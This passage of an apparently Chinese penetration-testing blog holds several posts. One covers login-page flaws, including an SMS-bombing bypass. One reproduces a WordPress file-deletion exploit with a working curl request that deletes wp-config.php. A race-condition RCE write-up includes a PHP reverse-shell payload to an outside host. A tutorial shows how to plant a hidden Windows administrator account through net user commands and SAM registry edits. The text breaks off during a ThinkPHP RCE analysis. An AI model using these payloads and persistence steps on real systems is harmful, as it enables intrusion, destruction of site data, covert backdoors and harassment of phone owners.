<p><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6ticex24vj30q90cq10e.jpg" alt></p>
<p>另一款是cewl，它通过爬行网站获取关键信息创建一个密码字典。</p>
<p>但我用了下，感觉生成的字典比较多冗余信息，很多关联不大的汉字都包含在字典中，个人觉得不是特别好用。</p>
<p>还有最近freebuf看了一篇文章，才发现hashcat这款爆破工具也能生成社工字典，感兴趣的朋友也可以去试试。</p>
<p>0x07 逻辑漏洞<br>逻辑漏洞是由于一些程序员未考虑到或者为贪图省事，而造成的逻辑上的漏洞，一般waf不容易拦截，因此和弱口令漏洞都是现在相对容易挖掘的一类漏洞。逻辑漏洞种类十分丰富，这里讲登陆框的逻辑漏洞，主要介绍一些技巧给大家拓宽一下思路，讲的不全请见谅。更详细的漏洞细节大家可以在网上查找资源（绝不是因为我懒）。</p>
<p>注册与忘记密码模块<br>云短信接受平台</p>
<p>相信有些朋友在测试注册模块的时候，会使用自己的手机号，而这就带来隐患：信息泄露，和短信骚扰。</p>
<p>这里给大家提供两个短信接受平台，让大家免去烦恼：</p>
<p><a href="https://www.pdflibr.com/" target="_blank" rel="noopener">https://www.pdflibr.com/
</a><br><a href="https://www.pdflibr.com/" target="_blank" rel="noopener">http://www.smszk.com/</a></p>
<p><strong>遍历已注册用户</strong></p>
<p>这个上面的社工例子有讲，可查到用户是否存在。<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6tid3lj8rj30tx07ht9m.jpg" alt></p>
<p>**任意用户注册</p>
<p>注册用户不需验证码认证即可注册成功的情况下，可使用工具发包，恶意批量注册用户。</p>
<p><strong>修改发送包邮箱尝试覆盖注册</strong></p>
<p>注册时显示某用户已注册；<br>在注册新用户时抓包，更改自己的账号信息为admin用户；<br>可能可以覆盖admin用户，重新注册成功。<br>任意密码重置</p>
<p>修改密码时使用其他人的手机号，可抓包更改成自己的手机号。自己手机收到验证信息并输入，可更改他人密码成功。</p>
<p><strong>跳过验证</strong></p>
<p>跳过验证步骤、找回方式，直接到设置新密码页面</p>
<p>这里直接用乌云的例子说明应该就懂了。</p>
<p><a href="http://www.anquan.us/static/bugs/wooyun-2015-098765.html" target="_blank" rel="noopener">中国电信某IDC机房信息安全管理系统设计缺陷致使系统沦陷</a></p>
<p><strong>短信轰炸</strong></p>
<p>短信轰炸，一般人可能抓包重放失败后就放弃了。这里有个技巧，</p>
<p>是从西门吹雪师傅博文里学到的绕过的姿势：</p>
<p>发送短信处一般每隔60秒才能发送一次<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tidgpb01j30tt0czdip.jpg" alt></p>
<p>但若是发包时在手机号后加上一个空格、加号或换行符等特殊字符。然后重新发送，这时若发送成功，则说明可绕过限制。</p>
<p><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6tidx88r2j30uc0fo41a.jpg" alt></p>
<p>此时在intruder模块只要持续递增空格就可造成无限短信轰炸</p>
<p><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tiebp2jmj30sw0nyk2v.jpg" alt><br><a href="http://ximcx.cn/post-143.html" target="_blank" rel="noopener">博文链接</a></p>
<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p><strong>越权访问目录</strong></p>
<p>可越权访问到后台路径，网站组件配置文件，备份文件等，当然扫目录字典也要好。</p>
<p><strong>修改身份标识</strong></p>
<p>更改成功登陆的用户的身份标识，可能就能越权访问到其他用户的页面。</p>
<p>例如：1、本人之前曾用test用户弱口令漏洞登陆成功，然后更改参数越权访问到admin用户；2、曾看过一漏洞：用户认证的token值是用户名加时间戳的md5值，而恰好数据包某处就有返回用户名加时间戳，然后更改时间戳前的用户名，md5后加在token上成功越权到其他用户上（这种漏洞一般需要细心查找登陆时身份认证参数的规律）</p>
<p>之前的任意密码重置等漏洞，其实也是修改用户身份标识，系统认证机制不完善导致漏洞出现。</p>
<p><strong>抓返回包</strong></p>
<p>在登陆时返回包可能返回用户敏感信息，此时改一改参数说不定还能越权查到其他用户信息。</p>
<p>或注册、找回密码发送短信邮箱时，可能直接返回验证码等</p>
<p>在返回包里，更改下参数为true、success、1，可能就能未授权进入后台</p>
<p>1登陆抓包，点击右键，抓取返回包<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tiepy71tj30th0b70u7.jpg" alt><br>2观察返回的参数<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tif4gp1bj30kl08e3z8.jpg" alt><br>3更改参数<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6tiffyxc3j30gi07o750.jpg" alt><br>4成功进入后台</p>
<p><strong>禁用js</strong></p>
<p>曾经碰到过一个站点，能未登陆访问后台首页，但再次点击就会退出到登陆页面。此时禁用js，然后成功访问部分功能模块，成功利用文件上传拿到webshell。</p>
<p>因为有些网站的Url跳转是由前端js控制，这时禁用js后说不定就能成功访问。</p>
<p>下面是火狐的一个禁用js的插件<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tifsq9hbj30tq05vt92.jpg" alt></p>
<h2 id="0x08-看网站源码信息"><a href="#0x08-看网站源码信息" class="headerlink" title="0x08 看网站源码信息"></a>0x08 看网站源码信息</h2><p>当你思路枯竭的时候不妨看看源码，它是一块宝藏，说不定就能在里面发现惊喜。有些程序员会把后台的功能链接放在前端源码中,说不定就存在未授权访问，甚至有些奇葩程序员在前端代码存放测试的账号密码。</p>
<p>首先给大家推荐一款工具，很强大：JSFinder</p>
<p>链接：<a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a></p>
<p>这是一款在网站的js文件中提取URL，子域名的工具，用在后台登陆界面抓取一些敏感的js文件效果也很不错，我曾用它抓取过网站后台的一个插件源码，后台的功能链接，敏感信息，接口链接（存在xss，注入）等等。我同学还说过burp也有抓js的插件，但可惜我没找到，用这款也差不多够用了。</p>
<p><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tig6pniuj30tw0irte6.jpg" alt></p>
<p>这里讲一下乌云的一个案例，具体链接忘记了，就讲一下思路：</p>
<p>洞主之前发现了一个漏洞，提交后，等过一段时间再去瞧下那个站，发现系统大变样，连url的路径都改了，已经修复了吗？</p>
<p>但是当洞主右键查看源代码时，发现还保留着之前旧系统的链接和代码，有的只是注释了而已，关键是漏洞竟然还没修？！tql，这种开发建议直接祭天。</p>
<p>看js代码，甚至一些图片的链接，说不定就有一番意外的收获。比如R3start大佬的一篇博文中讲的就很精彩从JS信息泄露到Webshell</p>
<p>文章的思路是：</p>
<p>作者进行渗透时，在一个图片链接中发现了一个三级子域名，删掉URl、直接访问根路径发现了一个title是某管理平台的页面。</p>
<p>但页面无法正常加载，故进行目录扫描得到后台地址和后台js压缩包，然后在源码的某处JS代码中发现了多个可登录的账号。</p>
<p>尝试弱口令无果后，从js压缩包查到了默认密码规则。成功登陆一个普通用户，但发现权限并不大。</p>
<p>然后通过js代码寻找获取到了别的接口地址，发现存在越权漏洞，通过JS接口越权访问到活动管理页面获取到管理员的登陆账号。</p>
<p>最后找上传点，抓包改后缀拿shell一气呵成。</p>
<p>引用R3start师傅的一句话：</p>
<p>右键查看JS源码，你可能会发现… 被注释的账号密码、接口、token、真实IP、开发环境…. 永远不知道程序员在JS中给你留下了什么样的惊喜。</p>
<h2 id="0x09-总结"><a href="#0x09-总结" class="headerlink" title="0x09 总结"></a>0x09 总结</h2><p>上面的内容比较杂，篇幅也比较长，所以有些地方就没有展开来讲。有些地方可能讲得比较简略模糊，请大家见谅，如果有疑惑可以联系我。</p>
<p>顺便说下感想：</p>
<p>这段时间的安服实习对我带来很大的帮助，面对一些系统目标固定，不能横向渗透。C段、端口扫描、子域名挖掘等信息收集都做不了，只能硬着头皮怼目标。而做安全服务经常碰到的就是后台登陆界面，怼着怼着就成长了，毕竟孰能生巧。</p>
<p>虽然渗透比较艰难，但也培养了我的漏洞挖掘能力。反思下自己以前挖漏洞，都是走马观花，面对信息收集来的一大堆资产，都是随便测下就结束，并没有深入且细心地去寻找漏洞，导致之前的SRC挖掘之旅十分困难。因此希望新手在挖洞时能够更加细心，特别是挖掘SRC时，有时就得花时间一个参数一个参数去”怼”，才能有所收获。要相信，大力出奇迹！</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/漏洞/">漏洞</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-精品文章/最新版wordpress任意文件删除漏洞复现" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/精品文章/最新版wordpress任意文件删除漏洞复现/" class="article-date">
      <time datetime="2019-12-06T17:03:10.571Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/精品文章/最新版wordpress任意文件删除漏洞复现/">最新版wordpress任意文件删除漏洞复现</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在推特上看到了一篇paper，<a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="noopener">点我啊</a></p>
<p>wp很久没看到洞了，这个漏洞七个月之前就上报了</p>
<p><img src="https://www.t00ls.net/attachments/month_1806/1806271941e0c68c6590fb61ce.jpg" alt></p>
<p>可以直接利用删除图片那个功能删除网站配置文件，导致网站只能重装。</p>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>这是我下载的最新版wordpress(4.9.6)</p>
<p><img src="https://www.t00ls.net/attachments/month_1806/18062719418e1d18c525441003.jpg" alt></p>
<p>登陆后台：</p>
<p><img src="https://www.t00ls.net/attachments/month_1806/18062719417422f20751eeb517.jpg" alt></p>
<p>上传张图片：</p>
<p><img src="https://www.t00ls.net/attachments/month_1806/1806271941c262f1600ee929f9.jpg" alt><br><img src="https://www.t00ls.net/attachments/month_1806/18062719417ba7d799ffd03dac.jpg" alt></p>
<p>然后edit</p>
<p>发挥一下Curl的作用。<br>执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://192.168.19.129/wordpress/wp-admin/post.php?post=7&apos; -H &apos;Cookie: wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=wing%7C1531306971%7CZycd9e4B1COvm6oKBWF2SlMfqWu2u0xTG85eAD4giBx%7C099559ea1580b258b82765641ac85a51576507c8c3ebb8e131b20c9eec8f65bc; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=wing%7C1531306971%7CZycd9e4B1COvm6oKBWF2SlMfqWu2u0xTG85eAD4giBx%7Cba9defabde03b6acdb4a5c43fc39244efbec15913483ae43ff0b624be552f5a4; wp-settings-time-1=1530097413&apos; -d &apos;action=editattachment&amp;_wpnonce=28380b3d4a&amp;thumb=../../../../wp-config.php&apos;</span><br></pre></td></tr></table></figure>
<p>这里把里面的cookie和_wpnonce还有post的值换成你的。</p>
<p>_wpnonce在页面中：</p>
<p><img src="https://www.t00ls.net/attachments/month_1806/18062719416e3066a6bbbff35a.jpg" alt></p>
<p><img src="https://www.t00ls.net/attachments/month_1806/180627194156de439440ffd6f8.jpg" alt></p>
<p>302跳转说明编辑成功。<br><img src="https://www.t00ls.net/attachments/month_1806/1806271941fac9a1bd5595aff2.jpg" alt></p>
<p><img src="https://www.t00ls.net/attachments/month_1806/18062719414486ac7e14bbfe0e.jpg" alt></p>
<p>现在点击Delete Permanently即可。<br><img src="https://www.t00ls.net/attachments/month_1806/18062719410de6e321efa45d83.jpg" alt></p>
<p><img src="https://www.t00ls.net/attachments/month_1806/18062719417bd0b5cc4ef818d3.jpg" alt></p>
<p>配置文件成功删除。</p>
<p>漏洞原理作者博客上有细节，本意是删除缩略图。但是没有对路径做限制，导致可以任意文件删除。</p>
<p>作者给的修复代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add_filter( &apos;wp_update_attachment_metadata&apos;, &apos;rips_unlink_tempfix&apos; );</span><br><span class="line"></span><br><span class="line">function rips_unlink_tempfix( $data ) &#123;</span><br><span class="line">    if( isset($data[&apos;thumb&apos;]) ) &#123;</span><br><span class="line">        $data[&apos;thumb&apos;] = basename($data[&apos;thumb&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Sakura"><a href="#Sakura" class="headerlink" title="Sakura"></a>Sakura</h2><p>鸡肋之处在于需要管理员权限，但是危害蛮大的。</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/漏洞/">漏洞</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-精品文章/利用竞争条件（Race Condition）对目标Web应用实现RCE" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/精品文章/利用竞争条件（Race Condition）对目标Web应用实现RCE/" class="article-date">
      <time datetime="2019-12-06T17:03:10.566Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/精品文章/利用竞争条件（Race Condition）对目标Web应用实现RCE/">利用竞争条件（Race Condition）对目标Web应用实现RCE</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p><img src="https://image.3001.net/images/20190927/1569574102_5d8dccd6280d4.jpeg" alt><br><strong>本文讲述了作者在某邀请测试项目中，通过对SQL注入和竞争条件（Race Condition）的组合利用，利用上传文件到服务器和服务器转移上传文件到Amazon S3的时间差，最终实现了对目标应用的RCE漏洞。由于该RCE漏洞的发现相对独特，所以作者在本文中着重从竞争条件（Race Condition）的触发机制说起，和大家分享。</strong></p>
<p>竞争条件（Race Condition）：计算机运行过程中，并发、无序、大量的进程在使用有限、独占、不可抢占的资源，由于进程无限，资源有限，产生矛盾，这种矛盾称为竞争（Race）。竞争条件（Race Condition）旨在描述一个系统或者进程的输出依赖于不受控制的事件出现顺序或者出现时机。由于两个或者多个进程竞争使用不能被同时访问的资源，使得这些进程有可能因为时间上推进的先后原因而出现问题。</p>
<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><strong>第一个上传功能点upload.php</strong><br>这里的前提是，我已经通过SQL注入获取到了目标Web应用的管理员账户凭据，然后登录到其内部管理界面后，我发现可通过该管理面板中的upload.php功能发布新闻或文章：<br><img src="https://image.3001.net/images/20190927/1569573792_5d8dcba09f119.png" alt></p>
<p>没做太多考虑，我就直接通过upload.php尝试上传了一个.php文件shell，但问题是该上传功能限制了对.php格式文件的上传，在变化.PhP、.php3、phpphp、空字符等形式的绕过方法后，还是不行：</p>
<p><img src="https://image.3001.net/images/20190927/1569573819_5d8dcbbb2d374.png" alt></p>
<p>然后，我想到了存储型XSS，能不能通过上传 .html、.xml或.svg格式文件呢？这一下上传总算成功了，但是，由于目标Web应用又会把用户上传文件转储到云端的S3存储桶中去，那在S3存储桶触发XSS也没意义了。好吧，那暂时把这个问题放一边，来看其它的。</p>
<p><strong>第二个上传功能点modify.php</strong><br>在没有头绪之时，我又返回管理面板中“news”栏目，想看看能不能在添加或编辑操作中发现可利用的点。此时，我注意到了“edit”功能，如下在这个非法上传文件右上端，我点击了其“edit”按钮：<br><img src="https://image.3001.net/images/20190927/1569573846_5d8dcbd6be03b.png" alt></p>
<p>然后跳出了以下包含upload to replacing the file的窗口：</p>
<p><img src="https://image.3001.net/images/20190927/1569573860_5d8dcbe4d0c4f.png" alt></p>
<p>我想到的是，它可能也是包含了限制过滤条件吧，但事实是，它没有任何后缀格式限制条件！可以上传任意文件！那就上传吧，如果没有限制条件的话，那它调用的应该不是之前的upload.php，确实是，它调用了另一上传功能点“modify.php”，以下是它的调用请求格式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;fileid&quot;</span><br><span class="line"></span><br><span class="line">31337</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">picture-1.png</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;description&quot;</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;reverse.php&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">exec(&quot;/bin/bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.20.30.40/21234 0&gt;&amp;1&apos;&quot;);</span><br><span class="line"></span><br><span class="line">-----------------------------09234599689937136550676151776</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;save&quot;</span><br><span class="line"></span><br><span class="line">Save</span><br></pre></td></tr></table></figure>
<p>大功告成了吗？并没有。目标Web应用之后还会把用户上传文件转储上传到云端S3存储桶中去，也就是说，如果被传到S3中去，在目标Web应用的服务器中，我们也没shell可反弹了。</p>
<p>竞争条件（Race Condition）响应错误获得本地文件路径</p>
<p>此时，毫无头绪之际，我通过burpsuite的 intruder 模式上传操作中，发现了响应长度的异常。有时候需要发起10个左右的请求，有时候则需要发起20–30个请求，才会出现这样的响应异常。正常来说，多数请求的响应长度为1147，但奇怪的是，在其中，会夹杂着长度为1710的响应。如多次上传空内容的rc.php，其请求样式为：</p>
<p><img src="https://image.3001.net/images/20190927/1569573928_5d8dcc28ae8c9.png" alt></p>
<p>以下是正常的长度为1147的响应：<br><img src="https://image.3001.net/images/20190929/15697498189460.png" alt></p>
<p>以下则是异常的长度为1710的响应，其中竟然返回了我们上传的php文件的本地路径：<br><img src="https://image.3001.net/images/20190929/15697498457248.png" alt></p>
<p>本想着，有了这个路径，那么完全就可以实现监听反弹了，但其实不然。当我通过浏览器访问该上传php文件后，Web应用返回了“File not Found”的提示，经再次检查后发现，该文件路径已经对应成了S3存储桶的路径了，所以，因此我猜测，我们的上传文件被目标Web应用移动到云端S3之前，在Web应用服务器中保存的时间大概会是短暂的1到2秒。</p>
<h4 id="用竞争条件（Race-Condition）反弹Shell并实现RCE"><a href="#用竞争条件（Race-Condition）反弹Shell并实现RCE" class="headerlink" title="用竞争条件（Race Condition）反弹Shell并实现RCE"></a>用竞争条件（Race Condition）反弹Shell并实现RCE</h4><p>根据以上的时间猜测，我就有一个想法：如果我们从客户端来触发竞争条件，通过浏览器反复请求上传文件路径，以此来争取对其的访问占有权限，这样的做法是否可行？</p>
<p>也就是：</p>
<p>在我们shell反弹服务器中设置端口监听 -&gt; 上传我们的反弹shell文件 -&gt; 发起多个请求执行竞争条件 -&gt; 获取长度异常的响应 -&gt; 从中获取上传shell文件路径并用浏览器访问并不断刷新（CTRL+R） -&gt; 以这种方式再次让目标Web应用处于竞争条件下, 我们就占有了对上传shell文件的继续访问权。</p>
<p>一试，果然行。以下是触发反弹shell实现RCE的竞争条件逻辑图：</p>
<p><img src="https://image.3001.net/images/20190927/1569574004_5d8dcc748d90b.png" alt></p>
<p>nc端监听返回的RCE结果：<br><img src="https://image.3001.net/images/20190927/1569574019_5d8dcc8375cc9.png" alt></p>
<h2 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h2><p>在上传文件本身被转移到云端S3存储桶之前，我们有可能获得上传文件的本地路径。哪怕只有1或2秒，就足以触发上传shell的成功反弹；</p>
<p>可多对上传或编辑功能点进行分析，如果它们是独立的调用，那么则需要比较它们可具体实现的操作。</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/漏洞/">漏洞</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-精品文章/windows创建隐藏用户" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/精品文章/windows创建隐藏用户/" class="article-date">
      <time datetime="2019-12-06T17:03:10.561Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/精品文章/windows创建隐藏用户/">windows创建隐藏用户</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>在渗透Windows时当我们可以任意命令执行时就需要创建一个账号，然后再进行深入的渗透，为了保证渗透的隐蔽性和持久性，创建一个隐藏用户就是一个常用、基础且非常重要的技能。</p>
<p>为什么不直接抓admin的密码呢？因为我之前对某目标做渗透时吃了次亏，在正常的使用MSF抓密码的过程中不知道对哪里造成了损害，导致目标的admin密码被销毁，然后就登录不上……当然，抓admin的密码并登录也是可以收获很多有用的东西的，说不定桌面就放了一份密码表，但这要在已经成功创建好一个隐藏账号的前提下进行。</p>
<p>首先创建一个账号，Windows下以”$”结尾的就是一个隐藏账号，然后将这个账号添加入Admin组中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user wuyou$ 123456 /add</span><br><span class="line">net localgroup administrators wuyou$ /add</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/1.png" alt></p>
<p>如上图，使用”net user”查看时没有新创建的”wuyou$”用户<br>但是，在 计算机管理 -&gt; 本地用户和组 中还是可以找到这个隐藏账号<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/2.png" alt></p>
<p>所以说我们现在创建的这个隐藏账号的隐蔽性还不够高，还需要再进行一步操作。<br>打开注册表，找到下面这个位置<br>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/3.png" alt>.png</p>
<p>由于SAM键值默认是只能system权限修改的，所以我们要修改一下SAM键的权限，给予administrator完全控制和读取的权限（右键，然后点击权限，给予完全控制权限后重新打开注册表）<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/4.png" alt></p>
<p>可以看到000001F4对应admin账号（随机生成一个十六进制来对应账号的name）<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/5.png" alt></p>
<p>然后将注册表导出<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/6.png" alt></p>
<p>将隐藏账号的F键的值替换成admin的F键的值<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/7.png" alt></p>
<p>然后在cmd下删除之前创建的隐藏账号<br>net user wuyou$ /del<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/8.png" alt></p>
<p>然后双击执行我们之前导出并修改了的注册表文件<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/9.png" alt></p>
<p> 可以看到这个账号已成功添加入注册表中</p>
<p>但是在本地用户和组中找不到<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/10.png" alt></p>
<p>而且可以进行远程桌面连接<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/11.png" alt></p>
<p>当然，这种隐藏账号在注册表中是可以找到的，当我们想要删除这个隐藏账号时就需要从注册表下手了。</p>
<p>下面是在 Windows 10 中打开注册表编辑器的两种方法：<br>1.在任务栏上的搜索框中，键入“regedit”。然后，选择注册表编辑器（桌面应用）最上面的结果。<br>2.长按或右键单击“开始”按钮，然后依次选择“运行”。在打开：框中输入“regedit”，选择“确定”。</p>
<p><strong>转载于</strong>：<a href="http://zone.secevery.com/article/1110" target="_blank" rel="noopener">http://zone.secevery.com/article/1110</a></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/漏洞/">漏洞</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-精品文章/ThinkPHP5.x 路由缺陷导致远程代码执行" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/精品文章/ThinkPHP5.x 路由缺陷导致远程代码执行/" class="article-date">
      <time datetime="2019-12-06T17:03:10.557Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/精品文章/ThinkPHP5.x 路由缺陷导致远程代码执行/">ThinkPHP5.x 路由缺陷导致远程代码执行</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ThinkPHP是一套国内流行的开源PHP MVC开发框架，其中存在3.x和5.x两个版本，目前3.x已停止维护，5.x为15年正式推出的，基本上对3.x进行了重构，针对于路由，也舍弃了默认的方式，正是因为新的路由存在缺陷，导致任意函数的调用。</p>
<h2 id="知识背景"><a href="#知识背景" class="headerlink" title="知识背景"></a>知识背景</h2><p>路由解析<br><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.jpg" alt></p>
<p>?s=index/index/hello</p>
<p>tp5中路由舍弃了3.x中的<strong>?m=index&amp;c=Index&amp;a=hello</strong>方式，而使用一个参数<strong>s</strong>传递所有信息，<strong>s=/index/Index/hello</strong>中三部分分别代表<strong>module,controller,action</strong>。此次出现问题的部分便是<strong>controller</strong>，由于<strong>ThinkPHP</strong>中命名空间和自动加载的作用，每个类都可被访问到，即导致每个类都可被当做<strong>controller</strong>。</p>
<p><img src="https://p0sec.net/usr/uploads/sinaimg/006tNbRwly1fy562obz8cj31dm0gg0vy.jpg" alt></p>
<p><strong>参数处理</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public function index($name)&#123;</span><br><span class="line">        return &apos;Hello &apos;+$name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>?s=index/test/index&amp;name=world</code></p>
<p>参数会自动处理，当然也可为数组，比如</p>
<p><code>?s=index/test/index&amp;name[0]=world&amp;&amp;name[1]=xx</code></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/2.jpg" alt><br>在5.1.x中函数名为<strong>parseModuleAndClass</strong>，功能一样</p>
<p><strong>parseClass()</strong>函数：</p>
<p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3.jpg" alt></p>
<p>正常情况下会对<strong>name</strong>进行处理，限制在<strong>app\index\controller</strong>命名空间。</p>
